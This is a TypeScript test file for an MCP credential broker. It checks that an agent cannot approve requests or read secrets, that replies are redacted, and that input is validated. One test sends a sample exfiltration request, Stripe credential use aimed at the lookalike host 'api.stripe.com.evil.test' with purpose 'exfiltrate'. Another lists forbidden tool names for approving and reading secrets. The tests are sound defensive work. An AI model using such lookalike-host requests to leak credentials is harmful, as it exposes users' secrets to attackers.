/**
 * The MCP surface, exercised through a real client over an in-memory transport.
 *
 * The point of testing at this level rather than calling the broker directly:
 * the security claim is about what the *transport* exposes. A unit test of the
 * broker cannot tell you that no approve tool is reachable.
 */

import test from "node:test";
import assert from "node:assert/strict";

import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { InMemoryTransport } from "@modelcontextprotocol/sdk/inMemory.js";

import { AGENT_TOOL_NAMES, buildServer } from "../src/server.js";
import { harness, STRIPE_SECRET } from "./helpers.js";
import type { EvidenceBroker } from "../src/broker.js";

async function connect(broker: EvidenceBroker): Promise<Client> {
  const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
  const server = buildServer(broker);
  const client = new Client({ name: "test-agent", version: "0.0.0" });
  await Promise.all([server.connect(serverTransport), client.connect(clientTransport)]);
  return client;
}

function textOf(result: unknown): string {
  const content = (result as { content?: Array<{ type: string; text?: string }> }).content ?? [];
  return content.map((c) => c.text ?? "").join("\n");
}

test("the advertised tool surface is exactly the agent-facing set", async () => {
  const { broker } = harness();
  const client = await connect(broker);
  try {
    const { tools } = await client.listTools();
    const names = tools.map((t) => t.name).sort();
    assert.deepEqual(names, [...AGENT_TOOL_NAMES].sort());
  } finally {
    await client.close();
  }
});

test("no tool can grant an approval or read a secret", async () => {
  const { broker } = harness();
  const client = await connect(broker);
  try {
    const { tools } = await client.listTools();
    const names = tools.map((t) => t.name);
    // The whole design rests on this. If a future change adds one of these,
    // the gate becomes decoration and this test should stop it.
    for (const forbidden of ["approve", "deny", "decide", "read_secret", "get_secret", "reveal", "set_policy"]) {
      assert.equal(names.includes(forbidden), false, `tool "${forbidden}" must not be reachable by the agent`);
    }
  } finally {
    await client.close();
  }
});

test("list_credentials over MCP returns scopes and no values", async () => {
  const { broker } = harness();
  const client = await connect(broker);
  try {
    const result = await client.callTool({ name: "list_credentials", arguments: {} });
    const text = textOf(result);
    assert.match(text, /STRIPE_KEY/);
    assert.match(text, /api\.stripe\.com/);
    assert.equal(text.includes(STRIPE_SECRET), false);
  } finally {
    await client.close();
  }
});

test("the full approve-then-send round trip works over MCP, with the secret redacted", async () => {
  const { broker } = harness({
    reply: { status: 200, headers: { "x-echo": STRIPE_SECRET }, body: `{"key":"${STRIPE_SECRET}"}` },
  });
  const client = await connect(broker);
  try {
    const requested = await client.callTool({
      name: "request_credential_use",
      arguments: {
        credential: "STRIPE_KEY",
        method: "GET",
        url: "https://api.stripe.com/v1/balance",
        purpose: "read the balance for reconciliation",
      },
    });
    const granted = JSON.parse(textOf(requested)) as { granted: boolean; grantId: string };
    assert.equal(granted.granted, true);

    const sent = await client.callTool({ name: "send", arguments: { grantId: granted.grantId } });
    const text = textOf(sent);
    assert.equal(text.includes(STRIPE_SECRET), false, "the secret came back through the MCP boundary");
    assert.match(text, /\[redacted:STRIPE_KEY\]/);
  } finally {
    await client.close();
  }
});

test("a denied request comes back flagged as an error, not as success", async () => {
  const { broker } = harness();
  const client = await connect(broker);
  try {
    const result = await client.callTool({
      name: "request_credential_use",
      arguments: {
        credential: "STRIPE_KEY",
        method: "GET",
        url: "https://api.stripe.com.evil.test/v1/balance",
        purpose: "exfiltrate",
      },
    });
    assert.equal((result as { isError?: boolean }).isError, true);
    assert.match(textOf(result), /host-not-allowed/);
  } finally {
    await client.close();
  }
});

test("verify_evidence is callable over MCP and reports a sound chain", async () => {
  const { broker } = harness();
  const client = await connect(broker);
  try {
    await client.callTool({
      name: "request_credential_use",
      arguments: { credential: "NOPE", method: "GET", url: "https://api.stripe.com/v1", purpose: "x" },
    });
    const result = await client.callTool({ name: "verify_evidence", arguments: {} });
    const parsed = JSON.parse(textOf(result)) as { ok: boolean; entries: number };
    assert.equal(parsed.ok, true);
    assert.equal(parsed.entries, 1);
  } finally {
    await client.close();
  }
});

test("input is validated at the boundary: a missing required argument is rejected", async () => {
  const { broker } = harness();
  const client = await connect(broker);
  try {
    // No `purpose`, which the operator needs in order to decide. The SDK
    // validates against the tool's schema and returns a tool error rather
    // than rejecting, so the call never reaches the broker.
    const result = await client.callTool({
      name: "request_credential_use",
      arguments: { credential: "STRIPE_KEY", method: "GET", url: "https://api.stripe.com/v1/balance" },
    });
    assert.equal((result as { isError?: boolean }).isError, true);
    assert.match(textOf(result), /validation error/i);
    assert.match(textOf(result), /purpose/);
    // Nothing was attempted, so nothing was sealed.
    assert.equal(broker.recentEvidence(10).length, 0);
  } finally {
    await client.close();
  }
});
